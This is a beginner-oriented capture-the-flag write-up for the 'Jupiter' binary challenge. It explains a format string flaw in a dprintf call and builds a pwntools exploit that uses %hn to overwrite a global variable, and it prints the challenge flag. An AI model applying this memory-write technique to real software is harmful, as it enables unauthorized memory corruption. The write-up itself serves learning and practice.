# Jupiter - Format String Exploitation Writeup

**Challenge:** Jupiter  
**Category:** Binary Exploitation  
**Difficulty:** Beginner/Intermediate  
**Flag:** `sun{F0rmat_str!ngs_4re_sup3r_pOwerFul_r1gh7??}`

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [Understanding the Vulnerability](#understanding-the-vulnerability)
4. [Prerequisite Concepts](#prerequisite-concepts)
5. [Exploring the Format String Vulnerability](#exploring-the-format-string-vulnerability)
6. [Understanding the Target](#understanding-the-target)
7. [Crafting the Exploit](#crafting-the-exploit)
8. [Common Beginner Questions Answered](#common-beginner-questions-answered)
9. [Final Exploit](#final-exploit)
10. [Lessons Learned](#lessons-learned)

---

## Challenge Overview

We're given a binary called `jupiter` that has a format string vulnerability. Our goal is to exploit this vulnerability to change a global variable's value and get the flag.

**Challenge Description:**
```
Welcome to Jupiter's echo terminal
Enter data at your own risk:
```

---

## Initial Analysis

### Running the Binary

```bash
$ ./jupiter
Welcome to Jupiter's echo terminal
Enter data at your own risk: Hello World
Hello World
```

The program reads our input and echoes it back. Let's check the security protections:

```bash
$ checksec jupiter
[*] '/path/to/jupiter'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

Key observations:
- **No PIE**: Addresses are fixed (easier for us!)
- **NX enabled**: We can't execute shellcode on the stack
- **Stack Canary**: Stack overflow protection exists

### Decompiling with Ghidra

Here's the decompiled `main()` function:

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  printf("Welcome to Jupiter\'s echo terminal\nEnter data at your own risk: ");
  read(0,&local_68,0x57);
  dprintf(2,(char *)&local_68);  // ← VULNERABLE LINE!
  if (secret_key == 0x1337c0de) {  // ← WIN CONDITION!
    read_flag();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

**Key Points:**
1. Buffer `local_68` (88 bytes from base pointer) can hold up to `0x57` (87) bytes
2. **VULNERABILITY**: `dprintf(2, (char *)&local_68)` - user input used as format string!
3. **WIN CONDITION**: If `secret_key == 0x1337c0de`, we get the flag

### Finding secret_key

In Ghidra, we find:

```
secret_key                                      XREF[2]:     Entry Point(*), main:004013a5(R)  
        00404010 de c0 ad 0b     undefined4 0BADC0DEh
```

Breaking this down:
- **Variable name**: `secret_key`
- **Address**: `0x00404010`
- **Current value**: `0x0BADC0DE` (stored as `de c0 ad 0b` due to little-endian)
- **Cross-references**: Used in `main` at address `0x004013a5` (read operation)

---

## Understanding the Vulnerability

### What is a Format String Vulnerability?

Format string functions like `printf()` use format specifiers to print values:

```c
// SAFE - proper usage
int age = 25;
printf("Age: %d", age);  // Output: Age: 25

// VULNERABLE - user controls format string
char user_input[100];
fgets(user_input, 100, stdin);
printf(user_input);  // DANGEROUS!
```

If user inputs `%x %x %x`, printf will read values from the stack even though no arguments were provided!

### Why is This Dangerous?

Format specifiers can:
- **Read memory**: `%x`, `%p`, `%s` leak stack/memory contents
- **Write memory**: `%n` writes the number of bytes printed to an address
- **Crash the program**: `%s` with invalid pointer causes segfault

---

## Prerequisite Concepts

### 1. Little-Endian Byte Order

**Definition**: The **least significant byte** (LSB) is stored at the **lowest memory address**.

#### Example: Storing `0x12345678`

```
Big-Endian (reads naturally):
Address  | Byte
---------|------
0x1000   | 0x12  ← Most significant
0x1001   | 0x34
0x1002   | 0x56
0x1003   | 0x78  ← Least significant

Little-Endian (x86/x64 - REVERSED):
Address  | Byte
---------|------
0x1000   | 0x78  ← Least significant FIRST
0x1001   | 0x56
0x1002   | 0x34
0x1003   | 0x12  ← Most significant LAST
```

#### Our Challenge Example

`secret_key` at `0x404010` has value `0x0BADC0DE`:

```
Address    | Byte Value | Explanation
-----------|------------|-------------
0x404010   | 0xDE       | Least significant byte
0x404011   | 0xC0       |
0x404012   | 0xAD       |
0x404013   | 0x0B       | Most significant byte

Read as 32-bit value: 0x0BADC0DE
```

When Ghidra shows `de c0 ad 0b`, it's showing raw memory bytes in order!

### 2. ASCII to Hexadecimal

Every character has a numeric value:

```
Character | ASCII (Decimal) | Hexadecimal
----------|-----------------|-------------
'%'       | 37              | 0x25
'p'       | 112             | 0x70
'A'       | 65              | 0x41
'\n'      | 10              | 0x0A
```

When you type `%p%p`, it's stored as bytes:
```
0x25 0x70 0x25 0x70
```

When read as a 64-bit integer (8 bytes together):
```
%p%p%p%p → 0x7025702570257025
```

This is why in our output we see `0x7025702570257025` - it's literally our input interpreted as a number!

### 3. Stack and Parameters

When a function is called, parameters and local variables are stored on the **stack**:

```
High Addresses
┌─────────────────┐
│ Parameter 4     │
│ Parameter 3     │
│ Parameter 2     │
│ Parameter 1     │ ← Arguments to function
│ Return Address  │
├─────────────────┤
│ Local Variable 1│
│ Local Variable 2│ ← Our buffer is here
│      ...        │
└─────────────────┘
Low Addresses
```

With format string vulnerability, printf **walks up the stack** treating memory as parameters, even if no parameters were passed!

---

## Exploring the Format String Vulnerability

### Initial Testing

Let's test if we can leak stack values:

```bash
$ ./jupiter
Welcome to Jupiter's echo terminal
Enter data at your own risk: %p
0x11
```

Success! We leaked `0x11` from the stack. Let's try more:

```bash
$ ./jupiter
Enter data at your own risk: %p %p %p %p %p %p %p %p
0x11 0xc (nil) (nil) 0x7025702570257025 0x7025702570257025 0xa (nil)
```

**Analysis:**
```
Parameter | Value                  | Explanation
----------|------------------------|----------------------------------
%1$p      | 0x11                   | Existing stack data
%2$p      | 0xc                    | Existing stack data
%3$p      | (nil)                  | NULL pointer
%4$p      | (nil)                  | NULL pointer
%5$p      | 0x7025702570257025     | OUR INPUT! (%p%p%p%p in hex)
%6$p      | 0x7025702570257025     | More of our input
%7$p      | 0xa                    | Newline character we typed (\n)
%8$p      | (nil)                  | NULL/end of buffer
```

**Critical Discovery**: Our input buffer starts appearing at **parameter 5**!

This means:
- Parameter 5 = `buffer[0-7]`
- Parameter 6 = `buffer[8-15]`
- Parameter 7 = `buffer[16-23]`
- Parameter 8 = `buffer[24-31]`

---

## Understanding the Target

### Current State vs. Goal

```
Current value of secret_key: 0x0BADC0DE
Target value:                0x1337C0DE

Memory layout at 0x404010:
Address    | Current | Target | Need Change?
-----------|---------|--------|-------------
0x404010   | 0xDE    | 0xDE   | NO ✓
0x404011   | 0xC0    | 0xC0   | NO ✓
0x404012   | 0xAD    | 0x37   | YES!
0x404013   | 0x0B    | 0x13   | YES!
```

**Key Insight**: The lower 2 bytes (`0xC0DE`) are already correct! We only need to change the upper 2 bytes from `0x0BAD` to `0x1337`.

### Partial Overwrite Strategy

Instead of overwriting all 4 bytes, we'll do a **partial overwrite**:
- Write 2 bytes (`0x1337`) to address `0x404012`
- This changes bytes at `0x404012` and `0x404013`
- Leaves `0x404010` and `0x404011` untouched

Result: `0x1337C0DE` ✓

---

## Crafting the Exploit

### The %n Format Specifier

`%n` is special - it **writes** instead of reading:

```c
int count;
printf("hello%n", &count);
//     ^^^^^ prints 5 characters
// Then: count = 5
```

**How it works:**
1. Printf keeps a counter of characters printed
2. When `%n` is encountered, it writes this counter to an address
3. The address comes from the next parameter

### The %hn Variant

- `%n` writes 4 bytes (int)
- `%hn` writes 2 bytes (short) ← We'll use this!
- `%hhn` writes 1 byte (char)

### Positional Parameters

Instead of sequential `%n`, we can specify position:

```c
printf("%3$d %1$d %2$d", 10, 20, 30);
// Output: 30 10 20
//         ↑  ↑  ↑
//        3rd 1st 2nd parameter
```

Format: `%<position>$<specifier>`

### Width Specification

We can control how many characters are printed:

```c
printf("%10c", 'A');
// Output: "         A"  (9 spaces + 'A' = 10 characters)
```

### Combining Everything

Our exploit will:
1. Print exactly `0x1337` (4919) characters using `%4919c`
2. Use `%7$hn` to write this count to address stored at parameter 7
3. Place target address `0x404012` at parameter 7's position

---

## Step-by-Step Exploit Development

### Step 1: Calculate the Payload Structure

We need:
- Format string that prints 4919 characters
- Position our target address at parameter 7
- Use `%7$hn` to write there

### Step 2: Byte Counting

Let's count bytes in our format string:

```
String        | Characters        | Byte Count
--------------|-------------------|------------
"%4919c%"     | %, 4, 9, 1, 9, c, % | 7 bytes
"7$hn"        | 7, $, h, n        | 4 bytes
--------------|-------------------|------------
Total:                              11 bytes
```

We need the address to land at byte 16 (parameter 7), so we need **5 more bytes** of padding:

```
Part           | Bytes | Position
---------------|-------|----------
"%4919c%7$hn"  | 11    | 0-10
"AAAAA"        | 5     | 11-15 (padding)
p64(0x404012)  | 8     | 16-23 (parameter 7!)
```

### Step 3: Understanding the Payload Layout

```python
payload = "%4919c%7$hn" + "AAAAA" + p64(0x404012)
```

Memory layout after sending:
```
Buffer Position | Content            | Stack Parameter
----------------|--------------------|-----------------
buf[0]:  '%'    |                   |
buf[1]:  '4'    |                   |
buf[2]:  '9'    |                   |
buf[3]:  '1'    |                   |
buf[4]:  '9'    |                   |
buf[5]:  'c'    |                   |
buf[6]:  '%'    |                   |
buf[7]:  '7'    |                   | Parameter 5
----------------|--------------------|-----------------
buf[8]:  '$'    |                   |
buf[9]:  'h'    |                   |
buf[10]: 'n'    |                   |
buf[11]: 'A'    |                   |
buf[12]: 'A'    |                   |
buf[13]: 'A'    |                   |
buf[14]: 'A'    |                   |
buf[15]: 'A'    |                   | Parameter 6
----------------|--------------------|-----------------
buf[16]: 0x12   | ┐                 |
buf[17]: 0x40   | │                 |
buf[18]: 0x40   | │ 0x404012        |
buf[19]: 0x00   | │ (little-endian) |
buf[20]: 0x00   | │                 |
buf[21]: 0x00   | │                 |
buf[22]: 0x00   | │                 |
buf[23]: 0x00   | ┘                 | Parameter 7
```

### Step 4: Execution Flow

When `dprintf(2, (char *)&local_68)` executes:

```
Time | Action                              | chars_printed | Memory
-----|-------------------------------------|---------------|------------------
T0   | printf starts processing            | 0             | 0x404012 = 0x0BAD
T1   | %4919c prints (4918 spaces + char)  | 4919          | 0x404012 = 0x0BAD
T2   | %7$hn reads parameter 7             | 4919          | 0x404012 = 0x0BAD
     | → finds address: 0x404012           |               |
T3   | Writes 0x1337 to address 0x404012   | 4919          | 0x404012 = 0x1337 ✓
T4   | printf finishes                     | 4919          | secret_key = 0x1337C0DE
```

### Step 5: Win Condition Triggered

```c
if (secret_key == 0x1337c0de) {  // TRUE!
    read_flag();  // Prints the flag
}
```

---

## Common Beginner Questions Answered

### Q1: What is parameter 7? I thought it's my input?

**Answer:** Parameter 7 **IS** your input, but at a specific position!

Think of parameters as "slots" that printf reads:
```
Slot 1-4: Old stack data
Slot 5: buf[0-7]    ← Your input starts here
Slot 6: buf[8-15]   ← More of your input
Slot 7: buf[16-23]  ← Even more of your input
```

You control what goes into these slots by controlling your input!

### Q2: How does `0x7025702570257025` appear?

**Answer:** It's ASCII to hex conversion!

```
Your input: '%' 'p' '%' 'p' '%' 'p' '%' 'p'
As bytes:   0x25 0x70 0x25 0x70 0x25 0x70 0x25 0x70
As 64-bit:  0x7025702570257025 (read right-to-left due to little-endian)
```

### Q3: `%4919c` is only 7 bytes, how does it print 4919 characters?

**Answer:** The **format string** is 7 bytes, but when **executed**, it prints 4919 characters!

```python
# The string itself:
"%4919c"  # Length: 7 bytes

# What it does when printf processes it:
printf("%4919c", some_char);
# Outputs: "                    X"  (4918 spaces + 1 char)
# Total printed: 4919 characters
```

### Q4: Why do we need `%7$hn`?

**Answer:** To tell printf WHERE to write!

- `7$` = "use parameter 7"
- `h` = "write as 2-byte short"
- `n` = "write character count to an address"

Without the `7$`, printf would use the next sequential parameter, which isn't where our address is!

### Q5: Why write to address `0x404012` instead of `0x404010`?

**Answer:** Because we only need to change the **upper 2 bytes**!

```
secret_key is 4 bytes at 0x404010:
0x404010: DE  ← Already correct (0xDE)
0x404011: C0  ← Already correct (0xC0)
0x404012: AD  ← Need to change to 0x37
0x404013: 0B  ← Need to change to 0x13

Writing 0x1337 to 0x404012 changes exactly those 2 bytes!
```

### Q6: What is `0xa` in the output?

**Answer:** It's the newline character!

When you press Enter, it adds `\n` (newline) to your input:
```
ASCII value of '\n': 10 (decimal) = 0x0A (hexadecimal)
```

### Q7: How does 4919 change the address `0x404012`?

**Answer:** 4919 doesn't change the ADDRESS, it changes the VALUE at that address!

```
Address (the mailbox): 0x404012  ← Never changes
Value (what's inside): 0x0BAD → 0x1337  ← This changes!
```

It's like:
```c
int *ptr = (int *)0x404012;  // Point to address 0x404012
*ptr = 4919;                 // Change what's AT that address
```

### Q8: Why parameter 7 specifically?

**Answer:** Because that's where our address lands based on byte counting!

```
Bytes 0-15:  Format string and padding
Bytes 16-23: Our address

Since parameters are 8 bytes each and start at byte 0:
- Parameter 5: bytes 0-7
- Parameter 6: bytes 8-15
- Parameter 7: bytes 16-23  ← Our address is here!
```

If we used `%5$hn`, it would try to use bytes 0-7 (the format string itself) as an address - wrong!

---

## Final Exploit

```python
from pwn import *

# Setup
elf = ELF("./jupiter")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

# Connect to challenge
p = remote("chal.sunshinectf.games", 25607)
# p = process(["./jupiter"])  # For local testing
# gdb.attach(p)
# pause()

# Exploit:
# 1. Print 0x1337 (4919) characters
# 2. Write that count to address at parameter 7
# 3. Place 0x404012 at parameter 7's position
payload = f"%{0x1337}c%7$hn".encode()  # Format string (11 bytes)
payload += b"A" * 5                     # Padding (5 bytes)
payload += p64(0x404012)                # Target address (8 bytes)

p.sendline(payload)
p.interactive()

# Flag: sun{F0rmat_str!ngs_4re_sup3r_pOwerFul_r1gh7??}
```

### Running the Exploit

```bash
$ python exploit.py
[+] Opening connection to chal.sunshinectf.games on port 25607
[*] Switching to interactive mode
                                  ... (4919 spaces) ...
sun{F0rmat_str!ngs_4re_sup3r_pOwerFul_r1gh7??}
```

---

## Lessons Learned

### Key Takeaways

1. **Format String Vulnerabilities** are powerful:
   - Can read arbitrary memory
   - Can write to arbitrary memory
   - All without buffer overflow!

2. **Little-Endian matters**:
   - Always remember byte order when working with multi-byte values
   - What looks like `0x0BADC0DE` is stored as `DE C0 AD 0B`

3. **Partial overwrites** are useful:
   - Don't always need to overwrite entire values
   - Can be more reliable and efficient

4. **Byte counting is critical**:
   - Every byte matters in payload construction
   - Must align addresses with correct parameter positions

5. **Stack layout understanding**:
   - Know where your input lands on the stack
   - Parameters are just positions in memory

### Format String Cheat Sheet

```
Specifier | Action                        | Size
----------|-------------------------------|-------
%d        | Print integer                 | Read
%x        | Print hex                     | Read
%p        | Print pointer                 | Read
%s        | Print string                  | Read
%n        | Write byte count              | 4 bytes
%hn       | Write byte count              | 2 bytes
%hhn      | Write byte count              | 1 byte
%<n>c     | Print with width n            | -
%<pos>$   | Use parameter at position pos | -
```

### Common Pitfalls

❌ **Wrong:** Forgetting little-endian byte order
✅ **Right:** `p64(0x404012)` in Python (automatically handles endianness)

❌ **Wrong:** Using wrong parameter number
✅ **Right:** Test with `%p` first to find where input appears

❌ **Wrong:** Not accounting for padding/alignment
✅ **Right:** Calculate exact byte positions


**Flag:** `sun{F0rmat_str!ngs_4re_sup3r_pOwerFul_r1gh7??}`
